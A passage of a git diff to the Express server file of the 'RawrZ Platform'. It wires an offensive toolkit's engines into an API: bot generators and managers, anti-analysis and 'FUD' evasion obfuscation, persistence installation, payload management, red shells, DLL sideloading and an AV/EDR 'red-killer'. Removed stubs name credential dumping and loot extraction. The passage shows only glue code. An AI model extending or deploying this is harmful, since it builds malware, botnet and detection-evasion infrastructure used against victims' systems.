@@ -1,206 +1,992 @@
-﻿const express=require('express');const cors=require('cors');const helmet=require('helmet');const path=require('path');const multer=require('multer');require('dotenv').config();
-const RawrZStandalone=require('./rawrz-standalone');const rawrzEngine=require('./src/engines/rawrz-engine');//const AdvancedStubGenerator=require('./src/engines/advanced-stub-generator');
-const httpBotGenerator=require('./src/engines/http-bot-generator');const HTTPBotManager=require('./src/engines/http-bot-manager');const stubGenerator=require('./src/engines/stub-generator');
-const antiAnalysis=require('./src/engines/anti-analysis');const hotPatchers=require('./src/engines/hot-patchers');
-const networkTools=require('./src/engines/network-tools');const healthMonitor=require('./src/engines/health-monitor');
-const digitalForensics=require('./src/engines/digital-forensics');const JottiScanner=require('./src/engines/jotti-scanner');
-const malwareAnalysis=require('./src/engines/malware-analysis');const PrivateVirusScanner=require('./src/engines/private-virus-scanner');
-//const CamelliaAssemblyEngine=require('./src/engines/camellia-assembly');const dualGenerators=require('./src/engines/dual-generators');
-const reverseEngineering=require('./src/engines/reverse-engineering');const nativeCompiler=require('./src/engines/native-compiler');
-const redKiller=require('./src/engines/red-killer');const EVCertEncryptor=require('./src/engines/ev-cert-encryptor');const redShells=require('./src/engines/red-shells');const beaconismDLL=require('./src/engines/beaconism-dll-sideloading');const evCertEncryptor=new EVCertEncryptor();
-const mutexEngine=require('./src/engines/mutex-engine');const opensslManagement=require('./src/engines/openssl-management');const implementationChecker=require('./src/engines/implementation-checker');const payloadManager=require('./src/engines/payload-manager');
+/**
+ * RawrZ Platform - Complete Server Implementation
+ * All engines integrated with proper API endpoints
+ */
 
-// Mock implementations for missing modules
-const mockModule = {
-    initialize: async () => ({ success: true }),
-    getStatus: () => ({ status: 'active', timestamp: new Date().toISOString() }),
-    generatePayload: async (target, type, options) => ({ generated: true, target, type, options }),
-    deployPayload: async (id, options) => ({ deployed: true, id, options }),
-    getPayloads: () => ({ payloads: [] }),
-    getSideloadTargets: () => ({ targets: [] }),
-    scanTarget: async (target) => ({ scanned: true, target }),
-    executeCommand: async (id, command) => ({ executed: true, id, command }),
-    terminateShell: async (id) => ({ terminated: true, id }),
-    getActiveShells: () => ({ shells: [] }),
-    getShellHistory: (id) => ({ history: [] }),
-    getShellStats: () => ({ stats: {} }),
-    createRedShell: async (type, options) => ({ created: true, type, options }),
-    getStatus: () => ({ status: 'active' }),
-    detectAVEDR: async () => ({ detected: false }),
-    executeRedKiller: async (systems) => ({ executed: true, systems }),
-    extractData: async (targets) => ({ extracted: true, targets }),
-    getLootContainer: async () => ({ loot: [] }),
-    inspectLootItem: async (id) => ({ item: { id } }),
-    dumpWiFiCredentials: async () => ({ wifi: [] }),
-    getActiveKills: async () => ({ kills: [] }),
-    applyPatch: async (target, type, data) => ({ applied: true, target, type, data }),
-    revertPatch: async (patchId) => ({ reverted: true, patchId }),
-    generateMutexCode: (language, options) => ({ code: 'mutex code', language, options }),
-    applyMutexToCode: async (code, language, options) => ({ applied: true, code, language, options }),
-    testOpenSSLAlgorithm: async (algorithm, data) => ({ tested: true, algorithm, data }),
-    applyOpenSSLPreset: async (preset) => ({ applied: true, preset }),
-    generateOpenSSLReport: async () => ({ report: 'OpenSSL report' }),
-    getOpenSSLStatus: async () => ({ status: 'active' }),
-    toggleOpenSSLMode: async (enabled) => ({ toggled: true, enabled }),
-    getResults: () => ({ results: [] }),
-    getModules: () => ({ modules: [] }),
-    forceCheck: async () => ({ forced: true }),
-    downloadFile: async (url) => ({ downloaded: true, url }),
-    readLocalFile: async (filename) => ({ read: true, filename }),
-    analyzeFile: async (filepath) => ({ analyzed: true, filepath })
-};
+const express = require('express');
+const cors = require('cors');
+const helmet = require('helmet');
+            const path = require('path');
+const multer = require('multer');
+require('dotenv').config();
 
-// Real module implementations - connect to actual engines
+// Core Engine Imports
+const RawrZStandalone = require('./rawrz-standalone');
+const rawrzEngine = require('./src/engines/rawrz-engine');
+const AdvancedStubGenerator = require('./src/engines/advanced-stub-generator');
+const advancedStubGenerator = new AdvancedStubGenerator();
+
+// Bot and Generator Engines
+const httpBotGenerator = require('./src/engines/http-bot-generator');
+const HTTPBotManager = require('./src/engines/http-bot-manager');
+const stubGenerator = require('./src/engines/stub-generator');
+const ircBotGenerator = require('./src/engines/irc-bot-generator');
+const multiPlatformBotGenerator = require('./src/engines/multi-platform-bot-generator');
+
+// Security and Analysis Engines
+const antiAnalysis = require('./src/engines/anti-analysis');
+const advancedAntiAnalysis = require('./src/engines/advanced-anti-analysis');
+const HotPatchers = require('./src/engines/hot-patchers');
+const hotPatchers = new HotPatchers();
+const malwareAnalysis = require('./src/engines/malware-analysis');
+const digitalForensics = require('./src/engines/digital-forensics');
+const JottiScanner = require('./src/engines/jotti-scanner');
+const PrivateVirusScanner = require('./src/engines/private-virus-scanner');
+const cveAnalysisEngine = require('./src/engines/cve-analysis-engine');
+
+// Crypto and Encryption Engines
+const advancedCrypto = require('./src/engines/advanced-crypto');
+const burnerEncryption = require('./src/engines/burner-encryption-engine');
+const compressionEngine = require('./src/engines/compression-engine');
+const polymorphicEngine = require('./src/engines/polymorphic-engine');
+const stealthEngine = require('./src/engines/stealth-engine');
+const CamelliaAssemblyEngine = require('./src/engines/camellia-assembly');
+const dualCryptoEngine = require('./src/engines/dual-crypto-engine');
+const EVCertEncryptor = require('./src/engines/ev-cert-encryptor');
+
+// System and Utility Engines
+const networkTools = require('./src/engines/network-tools');
+const healthMonitor = require('./src/engines/health-monitor');
+const memoryManager = require('./src/engines/memory-manager');
+const FileOperations = require('./src/engines/file-operations');
+const fileOperations = new FileOperations();
+const performanceOptimizer = require('./src/engines/performance-optimizer');
+const performanceWorker = require('./src/engines/performance-worker');
+const mutexEngine = require('./src/engines/mutex-engine');
+const opensslManagement = require('./src/engines/openssl-management');
+const implementationChecker = require('./src/engines/implementation-checker');
+const payloadManager = require('./src/engines/payload-manager');
+const startupPersistence = require('./src/engines/startup-persistence');
+
+// Advanced Engines
+const advancedAnalyticsEngine = require('./src/engines/advanced-analytics-engine');
+const advancedFUDEngine = require('./src/engines/advanced-fud-engine');
+const aiThreatDetector = require('./src/engines/ai-threat-detector');
+const apiStatus = require('./src/engines/api-status');
+const backupSystem = require('./src/engines/backup-system');
+const DualGenerators = require('./src/engines/dual-generators');
+const dualGenerators = new DualGenerators();
+const fullAssembly = require('./src/engines/full-assembly');
+const mobileTools = require('./src/engines/mobile-tools');
+const nativeCompiler = require('./src/engines/native-compiler');
+const pluginArchitecture = require('./src/engines/plugin-architecture');
+const templateGenerator = require('./src/engines/template-generator');
+const dotnetWorkaround = require('./src/engines/dotnet-workaround');
+const rawrzEngine2 = require('./src/engines/RawrZEngine2');
+
+// Red Team Engines
+const redKiller = require('./src/engines/red-killer');
+const redShells = require('./src/engines/red-shells');
+const beaconismDLL = require('./src/engines/beaconism-dll-sideloading');
+const reverseEngineering = require('./src/engines/reverse-engineering');
+
+// Real Module Implementations
 const realModules = {
-    // Beaconism DLL Sideloading
+    // Core Engines
+    rawrzEngine: {
+        initialize: async () => await rawrzEngine.initialize(),
+        getStatus: async () => await rawrzEngine.getStatus(),
+        loadModule: async (moduleName) => await rawrzEngine.loadModule(moduleName),
+        getAvailableModules: async () => await rawrzEngine.getAvailableModules(),
+        getSettings: async () => await rawrzEngine.getSettings(),
+        getPanelConfig: async () => await rawrzEngine.getPanelConfig(),
+        getAvailableEndpoints: async () => await rawrzEngine.getAvailableEndpoints(),
+        getCLICommands: async () => await rawrzEngine.getCLICommands()
+    },
+    
+    rawrzEngine2: {
+        initialize: async () => await rawrzEngine2.initialize(),
+        getStatus: async () => await rawrzEngine2.getStatus(),
+        executeOperation: async (operation, options) => await rawrzEngine2.executeOperation(operation, options)
+    },
+
+    // Bot Generators
+    httpBotGenerator: {
+        initialize: async () => await httpBotGenerator.initialize(),
+        getStatus: async () => await httpBotGenerator.getStatus(),
+        generateBot: async (options) => await httpBotGenerator.generateBot(options),
+        getBotTemplates: async () => await httpBotGenerator.getBotTemplates()
+    },
+
+    httpBotManager: {
+        initialize: async () => await HTTPBotManager.initialize(),
+        getStatus: async () => await HTTPBotManager.getStatus(),
+        createBot: async (options) => await HTTPBotManager.createBot(options),
+        getActiveBots: async () => await HTTPBotManager.getActiveBots()
+    },
+
+    ircBotGenerator: {
+        initialize: async () => await ircBotGenerator.initialize(),
+        getStatus: async () => await ircBotGenerator.getStatus(),
+        generateBot: async (options) => await ircBotGenerator.generateBot(options),
+        getSupportedLanguages: async () => await ircBotGenerator.getSupportedLanguages()
+    },
+
+    multiPlatformBotGenerator: {
+        initialize: async () => await multiPlatformBotGenerator.initialize(),
+        getStatus: async () => await multiPlatformBotGenerator.getStatus(),
+        generateMultiPlatformBot: async (platforms, options) => await multiPlatformBotGenerator.generateMultiPlatformBot(platforms, options)
+    },
+
+    // Security Engines
+    antiAnalysis: {
+        initialize: async () => await antiAnalysis.initialize(),
+        getStatus: async () => await antiAnalysis.getStatus(),
+        runAntiAnalysis: async (options) => await antiAnalysis.runAntiAnalysis(options),
+        getTechniques: async () => await antiAnalysis.getTechniques()
+    },
+
+    advancedAntiAnalysis: {
+        initialize: async () => await advancedAntiAnalysis.initialize(),
+        getStatus: async () => await advancedAntiAnalysis.getStatus(),
+        runAntiAnalysis: async (options) => await advancedAntiAnalysis.runAntiAnalysis(options),
+        getTechniques: async () => await advancedAntiAnalysis.getTechniques()
+    },
+
+    hotPatchers: {
+        initialize: async () => await hotPatchers.initialize(),
+        getStatus: async () => await hotPatchers.getStatus(),
+        applyPatch: async (target, patchType, options) => await hotPatchers.applyPatch(target, patchType, options),
+        revertPatch: async (patchId) => await hotPatchers.revertPatch(patchId),
+        getActivePatches: async () => await hotPatchers.getActivePatches()
+    },
+
+    // Analysis Engines
+    malwareAnalysis: {
+        initialize: async () => await malwareAnalysis.initialize(),
+        getStatus: async () => await malwareAnalysis.getStatus(),
+        analyzeFile: async (file, options) => await malwareAnalysis.analyzeFile(file, options)
+    },
+
+    digitalForensics: {
+        initialize: async () => await digitalForensics.initialize(),
+        getStatus: async () => await digitalForensics.getStatus(),
+        analyzeFileSystem: async (target, options) => await digitalForensics.analyzeFileSystem(target, options)
+    },
+    
+    jottiScanner: {
+        initialize: async () => await JottiScanner.initialize(),
+        getStatus: async () => await JottiScanner.getStatus(),
+        scanFile: async (filePath, options) => await JottiScanner.scanFile(filePath, options)
+    },
+    
+    privateVirusScanner: {
+        initialize: async () => await PrivateVirusScanner.initialize(),
+        getStatus: async () => await PrivateVirusScanner.getStatus(),
+        scanFile: async (filePath, options) => await PrivateVirusScanner.scanFile(filePath, options)
+    },
+
+    cveAnalysisEngine: {
+        initialize: async () => await cveAnalysisEngine.initialize(),
+        getStatus: async () => await cveAnalysisEngine.getStatus(),
+        analyzeCVE: async (cveId) => await cveAnalysisEngine.analyzeCVE(cveId),
+        searchCVEs: async (query, options) => await cveAnalysisEngine.searchCVEs(query, options),
+        getSettings: async () => await cveAnalysisEngine.getSettings(),
+        getPanelConfig: async () => await cveAnalysisEngine.getPanelConfig(),
+        getAvailableEndpoints: async () => await cveAnalysisEngine.getAvailableEndpoints(),
+        getCLICommands: async () => await cveAnalysisEngine.getCLICommands()
+    },
+
+    // Crypto Engines
+    advancedCrypto: {
+        initialize: async () => await advancedCrypto.initialize(),
+        getStatus: async () => await advancedCrypto.getStatus(),
+        encrypt: async (data, options) => await advancedCrypto.encrypt(data, options),
+        decrypt: async (data, options) => await advancedCrypto.decrypt(data, options),
+        setOpenSSLMode: async (enabled) => await advancedCrypto.setOpenSSLMode(enabled),
+        setCustomAlgorithms: async (enabled) => await advancedCrypto.setCustomAlgorithms(enabled),
+        getSettings: async () => await advancedCrypto.getSettings(),
+        getPanelConfig: async () => await advancedCrypto.getPanelConfig(),
+        getAvailableEndpoints: async () => await advancedCrypto.getAvailableEndpoints(),
+        getCLICommands: async () => await advancedCrypto.getCLICommands()
+    },
+
+    burnerEncryption: {
+        initialize: async () => await burnerEncryption.initialize(),
+        getStatus: async () => await burnerEncryption.getStatus(),
+        encrypt: async (data, options) => await burnerEncryption.encrypt(data, options),
+        decrypt: async (data, options) => await burnerEncryption.decrypt(data, options),
+        getSettings: async () => await burnerEncryption.getSettings(),
+        getPanelConfig: async () => await burnerEncryption.getPanelConfig(),
+        getAvailableEndpoints: async () => await burnerEncryption.getAvailableEndpoints(),
+        getCLICommands: async () => await burnerEncryption.getCLICommands()
+    },
+
+    compressionEngine: {
+        initialize: async () => await compressionEngine.initialize(),
+        getStatus: async () => await compressionEngine.getStatus(),
+        compress: async (data, options) => await compressionEngine.compress(data, options),
+        decompress: async (data, options) => await compressionEngine.decompress(data, options),
+        getSettings: async () => await compressionEngine.getSettings(),
+        getPanelConfig: async () => await compressionEngine.getPanelConfig(),
+        getAvailableEndpoints: async () => await compressionEngine.getAvailableEndpoints(),
+        getCLICommands: async () => await compressionEngine.getCLICommands()
+    },
+
+    polymorphicEngine: {
+        initialize: async () => await polymorphicEngine.initialize(),
+        getStatus: async () => await polymorphicEngine.getStatus(),
+        transform: async (data, options) => await polymorphicEngine.transform(data, options),
+        getSettings: async () => await polymorphicEngine.getSettings(),
+        getPanelConfig: async () => await polymorphicEngine.getPanelConfig(),
+        getAvailableEndpoints: async () => await polymorphicEngine.getAvailableEndpoints(),
+        getCLICommands: async () => await polymorphicEngine.getCLICommands()
+    },
+
+    stealthEngine: {
+        initialize: async () => await stealthEngine.initialize(),
+        getStatus: async () => await stealthEngine.getStatus(),
+        applyStealth: async (data, options) => await stealthEngine.applyStealth(data, options),
+        getSettings: async () => await stealthEngine.getSettings(),
+        getPanelConfig: async () => await stealthEngine.getPanelConfig(),
+        getAvailableEndpoints: async () => await stealthEngine.getAvailableEndpoints(),
+        getCLICommands: async () => await stealthEngine.getCLICommands()
+    },
+    
+    camelliaAssembly: {
+        initialize: async () => {
+            const camelliaAssembly = new CamelliaAssemblyEngine();
+            await camelliaAssembly.initialize();
+            return camelliaAssembly;
+        },
+        getStatus: async () => ({ status: 'active', name: 'Camellia Assembly Engine' }),
+        encrypt: async (data, options) => {
+            const camelliaAssembly = new CamelliaAssemblyEngine();
+            await camelliaAssembly.initialize();
+            return await camelliaAssembly.encrypt(data, options);
+        },
+        getSettings: async () => {
+            const camelliaAssembly = new CamelliaAssemblyEngine();
+            return await camelliaAssembly.getSettings();
+        },
+        getPanelConfig: async () => {
+            const camelliaAssembly = new CamelliaAssemblyEngine();
+            return await camelliaAssembly.getPanelConfig();
+        },
+        getAvailableEndpoints: async () => {
+            const camelliaAssembly = new CamelliaAssemblyEngine();
+            return await camelliaAssembly.getAvailableEndpoints();
+        },
+        getCLICommands: async () => {
+            const camelliaAssembly = new CamelliaAssemblyEngine();
+            return await camelliaAssembly.getCLICommands();
+        }
+    },
+
+    dualCryptoEngine: {
+        initialize: async () => await dualCryptoEngine.initialize(),
+        getStatus: async () => await dualCryptoEngine.getStatus(),
+        encrypt: async (data, options) => await dualCryptoEngine.encrypt(data, options),
+        decrypt: async (data, options) => await dualCryptoEngine.decrypt(data, options),
+        getSettings: async () => await dualCryptoEngine.getSettings(),
+        getPanelConfig: async () => await dualCryptoEngine.getPanelConfig(),
+        getAvailableEndpoints: async () => await dualCryptoEngine.getAvailableEndpoints(),
+        getCLICommands: async () => await dualCryptoEngine.getCLICommands()
+    },
+    
+    evCertEncryptor: {
+        initialize: async () => await evCertEncryptor.initialize(),
+        getStatus: async () => await evCertEncryptor.getStatus(),
+        generateCertificate: async (options) => await evCertEncryptor.generateCertificate(options),
+        getSettings: async () => await evCertEncryptor.getSettings(),
+        getPanelConfig: async () => await evCertEncryptor.getPanelConfig(),
+        getAvailableEndpoints: async () => await evCertEncryptor.getAvailableEndpoints(),
+        getCLICommands: async () => await evCertEncryptor.getCLICommands()
+    },
+    
+    // System Engines
+    networkTools: {
+        initialize: async () => await networkTools.initialize(),
+        getStatus: async () => await networkTools.getStatus(),
+        analyzeNetwork: async (target, options) => await networkTools.analyzeNetwork(target, options),
+        discoverNetworkInterfaces: async () => await networkTools.discoverNetworkInterfaces(),
+        portScan: async (target, ports, options) => await networkTools.portScan(target, ports, options),
+        scanPort: async (target, port, options) => await networkTools.scanPort(target, port, options),
+        dnsLookup: async (hostname, recordType) => await networkTools.dnsLookup(hostname, recordType),
+        connectivityTest: async (target, options) => await networkTools.connectivityTest(target, options),
+        performRealPingTest: async (target) => await networkTools.performRealPingTest(target),
+        performTraceroute: async (target) => await networkTools.performTraceroute(target),
+        getSettings: async () => await networkTools.getSettings(),
+        getPanelConfig: async () => await networkTools.getPanelConfig(),
+        getAvailableEndpoints: async () => await networkTools.getAvailableEndpoints(),
+        getCLICommands: async () => await networkTools.getCLICommands()
+    },
+
+    healthMonitor: {
+        initialize: async () => await healthMonitor.initialize(),
+        getStatus: async () => await healthMonitor.getStatus(),
+        getSystemHealth: async () => await healthMonitor.getSystemHealth(),
+        getSettings: async () => await healthMonitor.getSettings(),
+        getPanelConfig: async () => await healthMonitor.getPanelConfig(),
+        getAvailableEndpoints: async () => await healthMonitor.getAvailableEndpoints(),
+        getCLICommands: async () => await healthMonitor.getCLICommands()
+    },
+
+    memoryManager: {
+        initialize: async () => await memoryManager.initialize(),
+        getStatus: async () => await memoryManager.getStatus(),
+        getMemoryStats: async () => await memoryManager.getMemoryStats(),
+        getSettings: async () => await memoryManager.getSettings(),
+        getPanelConfig: async () => await memoryManager.getPanelConfig(),
+        getAvailableEndpoints: async () => await memoryManager.getAvailableEndpoints(),
+        getCLICommands: async () => await memoryManager.getCLICommands()
+    },
+
+    fileOperations: {
+        initialize: async () => await fileOperations.initialize(),
+        getStatus: async () => await fileOperations.getStatus(),
+        readFile: async (filePath, options) => await fileOperations.readFile(filePath, options),
+        writeFile: async (filePath, data, options) => await fileOperations.writeFile(filePath, data, options),
+        copyFile: async (sourcePath, destPath, options) => await fileOperations.copyFile(sourcePath, destPath, options),
+        moveFile: async (sourcePath, destPath, options) => await fileOperations.moveFile(sourcePath, destPath, options),
+        deleteFile: async (filePath, options) => await fileOperations.deleteFile(filePath, options),
+        fileExists: async (filePath) => await fileOperations.fileExists(filePath),
+        getFileStats: async (filePath) => await fileOperations.getFileStats(filePath),
+        listDirectory: async (dirPath, options) => await fileOperations.listDirectory(dirPath, options),
+        createDirectory: async (dirPath, options) => await fileOperations.createDirectory(dirPath, options),
+        backupFile: async (filePath, options) => await fileOperations.backupFile(filePath, options),
+        getSettings: async () => await fileOperations.getSettings(),
+        getPanelConfig: async () => await fileOperations.getPanelConfig(),
+        getAvailableEndpoints: async () => await fileOperations.getAvailableEndpoints(),
+        getCLICommands: async () => await fileOperations.getCLICommands()
+    },
+
+    performanceOptimizer: {
+        initialize: async () => await performanceOptimizer.initialize(),
+        getStatus: async () => await performanceOptimizer.getStatus(),
+        optimizePerformance: async (options) => await performanceOptimizer.optimizePerformance(options),
+        getSettings: async () => await performanceOptimizer.getSettings(),
+        getPanelConfig: async () => await performanceOptimizer.getPanelConfig(),
+        getAvailableEndpoints: async () => await performanceOptimizer.getAvailableEndpoints(),
+        getCLICommands: async () => await performanceOptimizer.getCLICommands()
+    },
+
+    performanceWorker: {
+        initialize: async () => await performanceWorker.initialize(),
+        getStatus: async () => await performanceWorker.getStatus(),
+        executeTask: async (task, options) => await performanceWorker.executeTask(task, options),
+        getSettings: async () => await performanceWorker.getSettings(),
+        getPanelConfig: async () => await performanceWorker.getPanelConfig(),
+        getAvailableEndpoints: async () => await performanceWorker.getAvailableEndpoints(),
+        getCLICommands: async () => await performanceWorker.getCLICommands()
+    },
+
+    mutexEngine: {
+        initialize: async () => await mutexEngine.initialize(),
+        getStatus: async () => await mutexEngine.getStatus(),
+        getSettings: async () => await mutexEngine.getSettings(),
+        getPanelConfig: async () => await mutexEngine.getPanelConfig(),
+        getAvailableEndpoints: async () => await mutexEngine.getAvailableEndpoints(),
+        getCLICommands: async () => await mutexEngine.getCLICommands()
+    },
+    
+    opensslManagement: {
+        initialize: async () => await opensslManagement.initialize(),
+        getStatus: async () => await opensslManagement.getStatus(),
+        getOpenSSLAlgorithms: async () => await opensslManagement.getOpenSSLAlgorithms(),
+        toggleOpenSSLMode: async (enabled) => await opensslManagement.toggleOpenSSLMode(enabled),
+        toggleCustomAlgorithms: async (enabled) => await opensslManagement.toggleCustomAlgorithms(enabled),
+        applyPreset: async (presetName) => await opensslManagement.applyPreset(presetName),
+        getSettings: async () => await opensslManagement.getSettings(),
+        getPanelConfig: async () => await opensslManagement.getPanelConfig(),
+        getAvailableEndpoints: async () => await opensslManagement.getAvailableEndpoints(),
+        getCLICommands: async () => await opensslManagement.getCLICommands()
+    },
+
+    implementationChecker: {
+        initialize: async () => await implementationChecker.initialize(),
+        getStatus: async () => await implementationChecker.getStatus(),
+        getResults: async () => await implementationChecker.getResults(),
+        getSettings: async () => await implementationChecker.getSettings(),
+        getPanelConfig: async () => await implementationChecker.getPanelConfig(),
+        getAvailableEndpoints: async () => await implementationChecker.getAvailableEndpoints(),
+        getCLICommands: async () => await implementationChecker.getCLICommands()
+    },
+
+    payloadManager: {
+        initialize: async () => await payloadManager.initialize(),
+        getStatus: async () => await payloadManager.getStatus(),
+        createPayload: async (options) => await payloadManager.createPayload(options),
+        getSettings: async () => await payloadManager.getSettings(),
+        getPanelConfig: async () => await payloadManager.getPanelConfig(),
+        getAvailableEndpoints: async () => await payloadManager.getAvailableEndpoints(),
+        getCLICommands: async () => await payloadManager.getCLICommands()
+    },
+
+    startupPersistence: {
+        initialize: async () => await startupPersistence.initialize(),
+        getStatus: async () => await startupPersistence.getStatus(),
+        installPersistence: async (targetPath, method, options) => await startupPersistence.installPersistence(targetPath, method, options),
+        getAvailableMethods: async () => await startupPersistence.getAvailableMethods(),
+        getSettings: async () => await startupPersistence.getSettings(),
+        getPanelConfig: async () => await startupPersistence.getPanelConfig(),
+        getAvailableEndpoints: async () => await startupPersistence.getAvailableEndpoints(),
+        getCLICommands: async () => await startupPersistence.getCLICommands()
+    },
+
+    // Advanced Engines
+    advancedAnalyticsEngine: {
+        initialize: async () => await advancedAnalyticsEngine.initialize(),
+        getStatus: async () => await advancedAnalyticsEngine.getStatus(),
+        generateReport: async (options) => await advancedAnalyticsEngine.generateReport(options),
+        getSettings: async () => await advancedAnalyticsEngine.getSettings(),
+        getPanelConfig: async () => await advancedAnalyticsEngine.getPanelConfig(),
+        getAvailableEndpoints: async () => await advancedAnalyticsEngine.getAvailableEndpoints(),
+        getCLICommands: async () => await advancedAnalyticsEngine.getCLICommands()
+    },
+
+    advancedFUDEngine: {
+        initialize: async () => await advancedFUDEngine.initialize(),
+        getStatus: async () => await advancedFUDEngine.getStatus(),
+        generateFUDCode: async (options) => await advancedFUDEngine.generateFUDCode(options),
+        applyBasicFUD: async (code, language, options) => await advancedFUDEngine.applyBasicFUD(code, language, options),
+        applyAdvancedFUD: async (code, language, options) => await advancedFUDEngine.applyAdvancedFUD(code, language, options),
+        applyExtremeFUD: async (code, language, options) => await advancedFUDEngine.applyExtremeFUD(code, language, options),
+        encryptStrings: async (code, language) => await advancedFUDEngine.encryptStrings(code, language),
+        randomizeVariableNames: async (code, language) => await advancedFUDEngine.randomizeVariableNames(code, language),
+        flattenControlFlow: async (code, language) => await advancedFUDEngine.flattenControlFlow(code, language),
+        getSettings: async () => await advancedFUDEngine.getSettings(),
+        getPanelConfig: async () => await advancedFUDEngine.getPanelConfig(),
+        getAvailableEndpoints: async () => await advancedFUDEngine.getAvailableEndpoints(),
+        getCLICommands: async () => await advancedFUDEngine.getCLICommands()
+    },
+    
+    aiThreatDetector: {
+        initialize: async () => await aiThreatDetector.initialize(),
+        getStatus: async () => await aiThreatDetector.getStatus(),
+        analyzeThreat: async (target) => await aiThreatDetector.analyzeThreat(target),
+        getSettings: async () => await aiThreatDetector.getSettings(),
+        getPanelConfig: async () => await aiThreatDetector.getPanelConfig(),
+        getAvailableEndpoints: async () => await aiThreatDetector.getAvailableEndpoints(),
+        getCLICommands: async () => await aiThreatDetector.getCLICommands()
+    },
+    
+    apiStatus: {
+        initialize: async () => await apiStatus.initialize(),
+        getStatus: async () => await apiStatus.getStatus(),
+        checkAPIs: async () => await apiStatus.checkAPIs(),
+        getSettings: async () => await apiStatus.getSettings(),
+        getPanelConfig: async () => await apiStatus.getPanelConfig(),
+        getAvailableEndpoints: async () => await apiStatus.getAvailableEndpoints(),
+        getCLICommands: async () => await apiStatus.getCLICommands()
+    },
+    
+    backupSystem: {
+        initialize: async () => await backupSystem.initialize(),
+        getStatus: async () => await backupSystem.getStatus(),
+        createBackup: async (options) => await backupSystem.createBackup(options),
+        listBackups: async (options) => await backupSystem.listBackups(options),
+        restoreBackup: async (backupId, destination) => await backupSystem.restoreBackup(backupId, destination),
+        getSettings: async () => await backupSystem.getSettings(),
+        getPanelConfig: async () => await backupSystem.getPanelConfig(),
+        getAvailableEndpoints: async () => await backupSystem.getAvailableEndpoints(),
+        getCLICommands: async () => await backupSystem.getCLICommands()
+    },
+
+    dualGenerators: {
+        initialize: async () => await dualGenerators.initialize(),
+        getStatus: async () => await dualGenerators.getGeneratorStatus(),
+        generateDual: async (target, options) => await dualGenerators.generateDual(target, options),
+        getSettings: async () => await dualGenerators.getSettings(),
+        getPanelConfig: async () => await dualGenerators.getPanelConfig(),
+        getAvailableEndpoints: async () => await dualGenerators.getAvailableEndpoints(),
+        getCLICommands: async () => await dualGenerators.getCLICommands()
+    },
+    
+    fullAssembly: {
+        initialize: async () => await fullAssembly.initialize(),
+        getStatus: async () => await fullAssembly.getStatus(),
+        generateAssembly: async (options) => await fullAssembly.generateAssembly(options),
+        getSettings: async () => await fullAssembly.getSettings(),
+        getPanelConfig: async () => await fullAssembly.getPanelConfig(),
+        getAvailableEndpoints: async () => await fullAssembly.getAvailableEndpoints(),
+        getCLICommands: async () => await fullAssembly.getCLICommands()
+    },
+    
+    mobileTools: {
+        initialize: async () => await mobileTools.initialize(),
+        getStatus: async () => await mobileTools.getStatus(),
+        analyzeMobile: async (target, options) => await mobileTools.analyzeMobile(target, options),
+        analyzeApp: async (appPath, platform) => await mobileTools.analyzeApp(appPath, platform),
+        analyzePermissions: async (appPath, platform) => await mobileTools.analyzePermissions(appPath, platform),
+        checkAppVulnerabilities: async (appPath, platform) => await mobileTools.checkAppVulnerabilities(appPath, platform),
+        detectSpecificCVE: async (cveId, vulnData, appPath, platform) => await mobileTools.detectSpecificCVE(cveId, vulnData, appPath, platform),
+        detectWebPHeapOverflow: async (vulnData, appPath, platform) => await mobileTools.detectWebPHeapOverflow(vulnData, appPath, platform),
+        detectHTTP2RapidReset: async (vulnData, appPath, platform) => await mobileTools.detectHTTP2RapidReset(vulnData, appPath, platform),
+        scanForMalware: async (appPath, platform) => await mobileTools.scanForMalware(appPath, platform),
+        deviceSecurityScan: async () => await mobileTools.deviceSecurityScan(),
+        getSettings: async () => await mobileTools.getSettings(),
+        getPanelConfig: async () => await mobileTools.getPanelConfig(),
+        getAvailableEndpoints: async () => await mobileTools.getAvailableEndpoints(),
+        getCLICommands: async () => await mobileTools.getCLICommands()
+    },
+
+    nativeCompiler: {
+        initialize: async () => await nativeCompiler.initialize(),
+        getStatus: async () => await nativeCompiler.getStatus(),
+        compileCode: async (code, language, options) => await nativeCompiler.compileCode(code, language, options),
+        detectCompilers: async () => await nativeCompiler.detectCompilers(),
+        checkCompiler: async (command) => await nativeCompiler.checkCompiler(command),
+        initializeRoslyn: async () => await nativeCompiler.initializeRoslyn(),
+        initializeNativeCompilers: async () => await nativeCompiler.initializeNativeCompilers(),
+        compileSource: async (sourceCode, language, options) => await nativeCompiler.compileSource(sourceCode, language, options),
+        chooseCompilationMethod: async (language, framework, outputFormat) => await nativeCompiler.chooseCompilationMethod(language, framework, outputFormat),
+        compileWithRoslyn: async (sourceCode, language, outputPath, options) => await nativeCompiler.compileWithRoslyn(sourceCode, language, outputPath, options),
+        compileWithDotnet: async (sourceCode, language, outputPath, options) => await nativeCompiler.compileWithDotnet(sourceCode, language, outputPath, options),
+        compileWithNative: async (sourceCode, language, outputPath, options) => await nativeCompiler.compileWithNative(sourceCode, language, outputPath, options),
+        compileWithWorkaround: async (sourceCode, language, outputPath, options) => await nativeCompiler.compileWithWorkaround(sourceCode, language, outputPath, options),
+        compileWithRuntime: async (sourceCode, language, outputPath, options) => await nativeCompiler.compileWithRuntime(sourceCode, language, outputPath, options),
+        compileJavaScript: async (sourceCode, outputPath, options) => await nativeCompiler.compileJavaScript(sourceCode, outputPath, options),
+        compileTypeScript: async (sourceCode, outputPath, options) => await nativeCompiler.compileTypeScript(sourceCode, outputPath, options),
+        getSettings: async () => await nativeCompiler.getSettings(),
+        getPanelConfig: async () => await nativeCompiler.getPanelConfig(),
+        getAvailableEndpoints: async () => await nativeCompiler.getAvailableEndpoints(),
+        getCLICommands: async () => await nativeCompiler.getCLICommands()
+    },
+    
+    pluginArchitecture: {
+        initialize: async () => await pluginArchitecture.initialize(),
+        getStatus: async () => await pluginArchitecture.getStatus(),
+        loadPlugin: async (pluginPath) => await pluginArchitecture.loadPlugin(pluginPath),
+        initializePluginRegistry: async () => await pluginArchitecture.initializePluginRegistry(),
+        initializePluginHooks: async () => await pluginArchitecture.initializePluginHooks(),
+        initializePluginEvents: async () => await pluginArchitecture.initializePluginEvents(),
+        initializePluginAPIs: async () => await pluginArchitecture.initializePluginAPIs(),
+        initializePluginSandboxes: async () => await pluginArchitecture.initializePluginSandboxes(),
+        loadExistingPlugins: async () => await pluginArchitecture.loadExistingPlugins(),
+        getSettings: async () => await pluginArchitecture.getSettings(),
+        getPanelConfig: async () => await pluginArchitecture.getPanelConfig(),
+        getAvailableEndpoints: async () => await pluginArchitecture.getAvailableEndpoints(),
+        getCLICommands: async () => await pluginArchitecture.getCLICommands()
+    },
